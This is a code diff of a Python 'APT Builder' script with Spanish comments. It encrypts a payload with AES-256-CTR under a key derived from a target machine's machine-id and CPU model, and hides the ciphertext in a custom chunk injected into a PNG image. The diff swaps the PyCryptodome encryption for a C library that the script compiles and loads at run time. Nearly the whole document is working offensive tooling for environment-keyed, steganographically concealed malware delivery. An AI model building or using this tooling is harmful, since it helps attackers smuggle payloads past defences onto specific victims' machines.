@@ -1,91 +1,100 @@
-import sys
 import os
 import struct
 import argparse
 import zlib
-from Crypto.Cipher import AES
+import ctypes
+import subprocess
 from Crypto.Hash import SHA256
 
 # Configuración
 CHUNK_NAME = b"loLO"
 SALT = b"LO_IS_WATCHING"
 
+# =============================================================================
+# C Wrapper for consistency
+# =============================================================================
+class AES_ctx(ctypes.Structure):
+    _fields_ = [("RoundKey", ctypes.c_uint8 * 240),
+                ("Iv", ctypes.c_uint8 * 16)]
+
+def compile_libcrypto():
+    if not os.path.exists("./libcrypto.so"):
+        print("[*] Compiling AES-256 micro-library for payload encryption compatibility...")
+        try:
+            subprocess.check_call(["gcc", "-shared", "-o", "libcrypto.so", "-fPIC", "loader_src/crypto_utils.c"])
+        except Exception as e:
+            print(f"[!] Failed to compile crypto lib: {e}")
+            exit(1)
+
+def encrypt_payload_custom(payload_data, key):
+    compile_libcrypto()
+    _lib = ctypes.CDLL("./libcrypto.so")
+
+    nonce = os.urandom(8)
+    iv = nonce + b'\x00'*8
+
+    ctx = AES_ctx()
+    key_buf = (ctypes.c_uint8 * 32).from_buffer_copy(key)
+    iv_buf = (ctypes.c_uint8 * 16).from_buffer_copy(iv)
+
+    _lib.AES_init_ctx_iv(ctypes.byref(ctx), key_buf, iv_buf)
+
+    data_len = len(payload_data)
+    data_buf = (ctypes.c_uint8 * data_len).from_buffer_copy(payload_data)
+
+    _lib.AES_CTR_xcrypt_buffer(ctypes.byref(ctx), data_buf, data_len)
+
+    return iv + bytes(data_buf)
+
+# =============================================================================
+
 def derive_key(machine_id, cpu_model):
     """Deriva la clave de cifrado basada en el entorno objetivo."""
-    raw_data = machine_id.strip().encode() + cpu_model.strip().encode() + SALT
+    # Simular el comportamiento del loader C
+    # En C: machine_id[32] bytes (leídos de archivo) + cpu_line (hasta newline) + SALT
+    # machine_id suele tener un newline al final en archivo?
+    # El archivo /etc/machine-id tiene 32 chars + \n.
+    # El código C hace `read(fd, machine_id, 32)`. NO lee el newline.
+    # Así que usamos los primeros 32 bytes de la string.
+
+    m_id = machine_id.strip()[:32].encode()
+    cpu = cpu_model.strip().encode() # El código C busca ':' y toma lo que sigue, quitando \n.
+
+    raw_data = m_id + cpu + SALT
     hasher = SHA256.new(raw_data)
     return hasher.digest()
 
 def create_png_chunk(type_bytes, data):
-    """Crea un chunk PNG válido (Length + Type + Data + CRC)."""
     if len(type_bytes) != 4:
         raise ValueError("Type must be 4 bytes")
 
     length = struct.pack(">I", len(data))
     chunk_type = type_bytes
     chunk_data = data
-    # CRC se calcula sobre Type + Data
     crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
     crc_bytes = struct.pack(">I", crc)
 
     return length + chunk_type + chunk_data + crc_bytes
 
 def inject_chunk(png_path, chunk_data, output_path):
-    """Inyecta el chunk antes del IEND."""
     with open(png_path, "rb") as f:
         png_data = f.read()
 
-    # Validar firma PNG
     if png_data[:8] != b'\x89PNG\r\n\x1a\n':
         raise ValueError("No es un archivo PNG válido")
 
-    # Buscar IEND
-    # Un chunk IEND válido siempre es: 00 00 00 00 49 45 4E 44 AE 42 60 82
-    iend_marker = b'\x00\x00\x00\x00IEND\xaeB`\x82'
+    # Inyectar antes del final es suficiente
+    iend_pos = png_data.rfind(b'IEND')
+    if iend_pos == -1:
+         # Fallback rudo: append
+         new_png = png_data + chunk_data
+    else:
+         # IEND chunk starts 4 bytes before 'IEND' (length)
+         chunk_start = iend_pos - 4
+         new_png = png_data[:chunk_start] + chunk_data + png_data[chunk_start:]
 
-    # Buscar la posición del IEND. Puede haber datos basura después, así que buscamos desde el final
-    # Pero lo más seguro es buscar el marcador de bloque IEND
-    # O recorrer los chunks. Recorrer es más robusto.
-
-    offset = 8
-    while offset < len(png_data):
-        length = struct.unpack(">I", png_data[offset:offset+4])[0]
-        chunk_type = png_data[offset+4:offset+8]
-
-        if chunk_type == b'IEND':
-            # Inyectar aquí
-            new_png = png_data[:offset] + chunk_data + png_data[offset:]
-            with open(output_path, "wb") as out:
-                out.write(new_png)
-            print(f"[*] Chunk inyectado en offset {offset}")
-            return
-
-        offset += 12 + length # 4(len) + 4(type) + len(data) + 4(crc)
-
-    raise ValueError("Chunk IEND no encontrado")
-
-def encrypt_payload(payload_path, key):
-    """Cifra el payload usando AES-256-CTR."""
-    with open(payload_path, "rb") as f:
-        data = f.read()
-
-    # Usar un IV fijo o aleatorio?
-    # Para CTR necesitamos IV (nonce). Lo pondremos al principio del blob.
-    # El loader leerá los primeros 16 bytes como IV.
-
-    # Mejor: Generar nonce de 8 bytes (64 bits) y dejar contador a 0.
-    nonce = os.urandom(8)
-    # IV (Counter Block) será Nonce + 0000000000000000
-    # PyCryptodome usa nonce como prefijo.
-    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
-    ciphertext = cipher.encrypt(data)
-
-    # El IV completo que necesita el loader (que implementa CTR crudo)
-    # Loader espera 16 bytes IV. En CTR, usualmente es Nonce(8) + Counter(8).
-    # PyCryptodome por defecto usa un contador big endian de 64 bits empezando en 0.
-    full_iv = nonce + b'\x00'*8
-
-    return full_iv + ciphertext
+    with open(output_path, "wb") as out:
+        out.write(new_png)
 
 def main():
     parser = argparse.ArgumentParser(description="The Architect - APT Builder")
@@ -103,7 +112,10 @@ def main():
     key = derive_key(args.machine_id, args.cpu_model)
     print(f"[*] Derived Key: {key.hex()[:8]}...")
 
-    encrypted_blob = encrypt_payload(args.payload, key)
+    with open(args.payload, "rb") as f:
+        p_data = f.read()
+
+    encrypted_blob = encrypt_payload_custom(p_data, key)
     print(f"[*] Payload encrypted ({len(encrypted_blob)} bytes)")
 
     chunk = create_png_chunk(CHUNK_NAME, encrypted_blob)
